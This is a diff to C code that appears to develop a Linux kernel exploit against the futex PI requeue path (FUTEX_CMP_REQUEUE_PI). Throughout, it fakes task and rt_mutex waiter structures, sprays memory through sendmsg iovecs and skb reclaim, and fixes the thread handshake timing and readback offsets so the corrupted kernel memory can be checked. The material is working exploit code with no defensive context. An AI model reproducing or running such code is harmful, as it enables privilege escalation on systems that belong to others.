@@ -23,6 +23,7 @@ static atomic_int s2_owner_stop;
 static atomic_int s2_route_done;
 static atomic_int s2_waiter_tid;
 static atomic_int s2_go;
+static atomic_int s2_requeue_complete;
 static atomic_int s2_sendmsg_armed;
 static atomic_int s2_punch_allowed;
 static atomic_int s2_punch_calls;
@@ -47,10 +48,11 @@ static void s2_log_verdict(int pass, const char *reason) {
   pr_info("H1A-S2 verdict=%s reason=%s\n", pass ? "PASS" : "FAIL", reason);
 }
 
-static int s2_carrier_contract_ok(
+__attribute__((noinline)) static int s2_carrier_contract_ok(
     const struct iovec *iov, const struct msghdr *mh,
     const unsigned char *name) {
-  if (mh->msg_namelen != 32 || mh->msg_iov != iov ||
+  if (!name || mh->msg_name != name || mh->msg_namelen != 32 ||
+      mh->msg_iov != iov ||
       mh->msg_iovlen != 8 || mh->msg_control != NULL ||
       mh->msg_controllen != 0 || mh->msg_flags != 0) {
     return 0;
@@ -62,6 +64,11 @@ static int s2_carrier_contract_ok(
   for (int i = 5; i <= 7; ++i) {
     if (iov[i].iov_base != NULL || iov[i].iov_len != 0) return 0;
   }
+  uint64_t total_len = 0;
+  for (int i = 0; i < 8; ++i) {
+    total_len += iov[i].iov_len;
+  }
+  if (total_len != (uint64_t)S2_IOV_TOTAL) return 0;
 
   unsigned char expect[32];
   memset(expect, 0, sizeof(expect));
@@ -219,6 +226,7 @@ static void s2_readback_evidence(void) {
   memset(&msg, 0, sizeof(msg));
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
+  const size_t bias = (size_t)SKB_FRAG_BIAS;
 
   for (int i = 0; i < SKB_RECLAIM_SENDS; ++i) {
     errno = 0;
@@ -227,28 +235,39 @@ static void s2_readback_evidence(void) {
       break;
     }
     size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
-    if (check < (size_t)FAKE_TASK_OFF + 0x8e0) {
+    if (check < bias + (size_t)FAKE_TASK_OFF + 0x8e0) {
       continue;
     }
-    uint64_t proxy_pc = 0;
-    uint64_t proxy_right = 0;
-    uint64_t proxy_left = 0;
+    uint64_t proxy_lock_pc = 0;
+    uint64_t proxy_lock_right = 0;
+    uint64_t proxy_lock_left = 0;
+    uint64_t proxy_pi_pc = 0;
+    uint64_t proxy_pi_right = 0;
+    uint64_t proxy_pi_left = 0;
     uint64_t ft_root = 0;
     uint64_t lock_wait_lock = 0;
     uint64_t lock_owner = 0;
-    memcpy(&proxy_pc, rbuf + W0_OFF + 0x18, sizeof(proxy_pc));
-    memcpy(&proxy_right, rbuf + W0_OFF + 0x20, sizeof(proxy_right));
-    memcpy(&proxy_left, rbuf + W0_OFF + 0x28, sizeof(proxy_left));
-    memcpy(&ft_root, rbuf + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+    memcpy(&proxy_lock_pc, rbuf + bias + W0_OFF + 0x00,
+           sizeof(proxy_lock_pc));
+    memcpy(&proxy_lock_right, rbuf + bias + W0_OFF + 0x08,
+           sizeof(proxy_lock_right));
+    memcpy(&proxy_lock_left, rbuf + bias + W0_OFF + 0x10,
+           sizeof(proxy_lock_left));
+    memcpy(&proxy_pi_pc, rbuf + bias + W0_OFF + 0x18, sizeof(proxy_pi_pc));
+    memcpy(&proxy_pi_right, rbuf + bias + W0_OFF + 0x20,
+           sizeof(proxy_pi_right));
+    memcpy(&proxy_pi_left, rbuf + bias + W0_OFF + 0x28,
+           sizeof(proxy_pi_left));
+    memcpy(&ft_root, rbuf + bias + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            sizeof(ft_root));
-    memcpy(&lock_wait_lock, rbuf + LOCK_OFF, sizeof(lock_wait_lock));
-    memcpy(&lock_owner, rbuf + LOCK_OFF + 0x18, sizeof(lock_owner));
+    memcpy(&lock_wait_lock, rbuf + bias + LOCK_OFF, sizeof(lock_wait_lock));
+    memcpy(&lock_owner, rbuf + bias + LOCK_OFF + 0x18, sizeof(lock_owner));
     pr_info("H1A-S2 readback proxy_tree_self=%d proxy_pi_self=%d "
             "ft_pi_root=%016llx\n",
-            proxy_pc == (uint64_t)(fake_w0 + 0x00) &&
-              proxy_right == 0 && proxy_left == 0,
-            proxy_pc == (uint64_t)(fake_w0 + 0x18) &&
-              proxy_right == 0 && proxy_left == 0,
+            proxy_lock_pc == 1 && proxy_lock_right == 0 &&
+              proxy_lock_left == 0,
+            proxy_pi_pc == 1 && proxy_pi_right == 0 &&
+              proxy_pi_left == 0,
             (unsigned long long)ft_root);
     pr_info("H1A-S2 evidence lock_wait_lock=%016llx lock_owner=%016llx "
             "ft_root_plausible=%d\n",
@@ -294,7 +313,9 @@ static void *s2_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
 
-  while (!atomic_load(&s2_go)) {
+  /* The sendmsg stack shape is usable only after CMP_REQUEUE_PI has fully
+   * returned; s2_go deliberately starts after that handshake. */
+  while (!atomic_load(&s2_requeue_complete)) {
     __asm__ volatile("yield" ::: "memory");
   }
   unsigned char name[128];
@@ -504,13 +525,14 @@ int slide_h1a_s2_test(void) {
     s2_msleep(1);
   }
   s2_msleep(100);
-  atomic_store(&s2_go, 1);
   errno = 0;
   int requeue_ret = futex_op(&s2_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                              (void *)1, &s2_f_pi_target, 0);
   int requeue_errno = errno;
   atomic_store(&s2_requeue_ret, requeue_ret);
   atomic_store(&s2_requeue_errno, requeue_errno);
+  atomic_store(&s2_requeue_complete, 1);
+  atomic_store(&s2_go, 1);
 
   pthread_join(s2_consumer_handle, NULL);
   if (s2_peer_fd >= 0) {
